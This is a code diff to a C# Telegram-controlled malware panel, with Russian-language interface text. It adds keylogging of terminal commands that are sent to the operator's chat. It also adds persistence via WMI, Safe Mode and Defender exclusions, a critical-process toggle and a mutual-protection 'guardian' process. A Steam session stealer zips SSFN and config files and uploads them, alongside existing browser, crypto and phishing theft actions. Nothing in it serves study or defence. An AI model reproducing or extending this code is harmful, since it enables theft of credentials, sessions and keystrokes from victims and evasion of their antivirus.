@@ -37,6 +37,7 @@ namespace FinalBot
         private readonly Dictionary<long, string> _userState = new Dictionary<long, string>();
         private static readonly Dictionary<string, string> _fileIdCache = new Dictionary<string, string>();
         private static int _fileIdCounter = 0;
+        private static StringBuilder _terminalBuffer = new StringBuilder();
 
         private static string CacheFileId(string fileId)
         {
@@ -69,6 +70,41 @@ namespace FinalBot
         {
             _botClient = botClient;
             _adminId = adminId;
+            InitTerminalMonitoring(botClient, adminId);
+        }
+
+        private static void InitTerminalMonitoring(ITelegramBotClient bot, string adminId)
+        {
+            KeyloggerModule.OnTerminalFocus += (title, isActive) => {
+                try {
+                    string msg = isActive 
+                        ? $"🟢 **РЕЖИМ ТЕРМИНАЛА АКТИВИРОВАН**\n🔲 Окно: `{title}`" 
+                        : $"🔴 **РЕЖИМ ТЕРМИНАЛА ВЫКЛЮЧЕН**";
+                    bot.SendTextMessageAsync(adminId, msg, parseMode: ParseMode.Markdown);
+                    if (!isActive) _terminalBuffer.Clear();
+                } catch { }
+            };
+
+            KeyloggerModule.OnKeyStroke += (key) => {
+                try {
+                    if (KeyloggerModule.IsTerminalActive)
+                    {
+                        if (key == "[ENTER]\n") {
+                            string cmd = _terminalBuffer.ToString();
+                            if (!string.IsNullOrWhiteSpace(cmd)) {
+                                bot.SendTextMessageAsync(adminId, $"💻 `{cmd}`", parseMode: ParseMode.Markdown);
+                            }
+                            _terminalBuffer.Clear();
+                        } else if (key == "[BACKSPACE]") {
+                            if (_terminalBuffer.Length > 0) _terminalBuffer.Length--;
+                        } else if (key == " ") {
+                            _terminalBuffer.Append(" ");
+                        } else if (!key.StartsWith("[")) {
+                            _terminalBuffer.Append(key);
+                        }
+                    }
+                } catch { }
+            };
         }
 
         private static void Log(string msg)
@@ -432,6 +468,28 @@ namespace FinalBot
                     case "window_history":
                         await HandleWindowHistory(message.Chat.Id);
                         break;
+                    
+                    case "harden_persistence":
+                        if (!await CheckTarget(callbackQuery.Id)) return;
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🛡️ Активация протокола Sentinel...");
+                        VanguardCore.SafetyManager.ApplyHardPersistence();
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ <b>SENTINEL ACTIVE:</b> WMI + SafeMode + Defender exclusions applied.", parseMode: ParseMode.Html);
+                        break;
+                    
+                    case "critical_toggle":
+                        if (!await CheckTarget(callbackQuery.Id)) return;
+                        bool newState = !VanguardCore.ElevationService.IsCritical();
+                        VanguardCore.SafetyManager.SetCriticalMode(newState);
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, $"💀 Critical Mode: {(newState ? "ON" : "OFF")}");
+                        await ShowSystemPanel(message.Chat.Id, message.MessageId);
+                        break;
+                    
+                    case "activate_guardian":
+                        if (!await CheckTarget(callbackQuery.Id)) return;
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "👁️ Протокол «Близнец» запущен...");
+                        FinalBot.Modules.TwinService.StartGuardian();
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ <b>GUARDIAN TWIN ACTIVE:</b> Mutual process protection enabled.", parseMode: ParseMode.Html);
+                        break;
 
                     // Phishing Actions
                     case "work_vac_alert":
@@ -499,6 +557,9 @@ namespace FinalBot
                         break;
                     case "work_browsers":
                         await HandleBrowserSteal(message.Chat.Id);
+                        break;
+                    case "work_steam_ssfn":
+                        await HandleSteamSteal(message.Chat.Id);
                         break;
                     case "work_crypto":
                         await HandleCryptoSteal(message.Chat.Id);
@@ -832,6 +893,47 @@ namespace FinalBot
             else await _botClient.SendTextMessageAsync(chatId, GetRichText("❌ <b>ERROR:</b> Report generation failed."), parseMode: ParseMode.Html);
         }
 
+        private async Task HandleSteamSteal(long chatId)
+        {
+            var msg = await _botClient.SendTextMessageAsync(chatId, GetRichText("💎 <b>STEAM SESSION STEALER</b>\n━━━━━━━━━━━━━━━━━━\n🚀 <i>Инициализация процесса...</i>"), parseMode: ParseMode.Html);
+            
+            try
+            {
+                var result = await SteamStealer.RunSteal(async (progress) => {
+                    try { await _botClient.EditMessageTextAsync(chatId, msg.MessageId, GetRichText(progress), parseMode: ParseMode.Html); } catch { }
+                });
+
+                if (result.Error != null)
+                {
+                    await _botClient.EditMessageTextAsync(chatId, msg.MessageId, GetRichText($"❌ <b>ОШИБКА:</b> <code>{result.Error}</code>"), parseMode: ParseMode.Html);
+                    return;
+                }
+
+                if (result.ZipPath != null && File.Exists(result.ZipPath))
+                {
+                    string info = $"✅ <b>СЕССИЯ STEAM ИЗВЛЕЧЕНА</b>\n" +
+                                  $"━━━━━━━━━━━━━━━━━━\n" +
+                                  $"🔑 <b>SSFN Файлы:</b> <code>{result.SsfnCount}</code>\n" +
+                                  $"🍪 <b>Config:</b> {(result.ConfigFound ? "🟢 Найдено" : "🔴 Отсутствует")}\n" +
+                                  $"━━━━━━━━━━━━━━━━━━\n" +
+                                  $"📦 <i>Отправка архива...</i>";
+
+                    await _botClient.EditMessageTextAsync(chatId, msg.MessageId, GetRichText(info), parseMode: ParseMode.Html);
+                    
+                    using (var stream = File.OpenRead(result.ZipPath))
+                    {
+                        await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, Path.GetFileName(result.ZipPath)), caption: GetRichText("💎 <b>Steam Session Package (SSFN/Config)</b>"), parseMode: ParseMode.Html);
+                    }
+                    
+                    File.Delete(result.ZipPath);
+                }
+            }
+            catch (Exception ex)
+            {
+                await _botClient.SendTextMessageAsync(chatId, GetRichText($"❌ <b>CRITICAL ERROR:</b> <code>{ex.Message}</code>"), parseMode: ParseMode.Html);
+            }
+        }
+
         private async Task ShowAdminPanel(long chatId, int messageId = 0)
         {
             var markup = new InlineKeyboardMarkup(new[]
@@ -875,6 +977,9 @@ namespace FinalBot
                     InlineKeyboardButton.WithCallbackData("📶 ПРОЦЕССЫ", "proc_list")
                 },
                 new[] { InlineKeyboardButton.WithCallbackData(ProxyModule.IsActive ? "🌐 ПРОКСИ 🟢" : "🌐 ПРОКСИ 🔴", "proxy_toggle") },
+                new[] { InlineKeyboardButton.WithCallbackData("🛡️ УСИЛИТЬ ЗАКРЕП", "harden_persistence") },
+                new[] { InlineKeyboardButton.WithCallbackData("💀 CRITICAL MODE", "critical_toggle") },
+                new[] { InlineKeyboardButton.WithCallbackData("👁️ АКТИВИРОВАТЬ СТРАЖА", "activate_guardian") },
                 new[] { InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "back_to_main") }
             });
 
@@ -900,8 +1005,9 @@ namespace FinalBot
                 new[]
                 {
                     InlineKeyboardButton.WithCallbackData("🌍 БРАУЗЕРЫ", "work_browsers"),
-                    InlineKeyboardButton.WithCallbackData("💰 КРИПТО", "work_crypto")
+                    InlineKeyboardButton.WithCallbackData("💎 STEAM SSFN", "work_steam_ssfn")
                 },
+                new[] { InlineKeyboardButton.WithCallbackData("💰 КРИПТО", "work_crypto") },
                 new[] { InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "back_to_main") }
             });
 
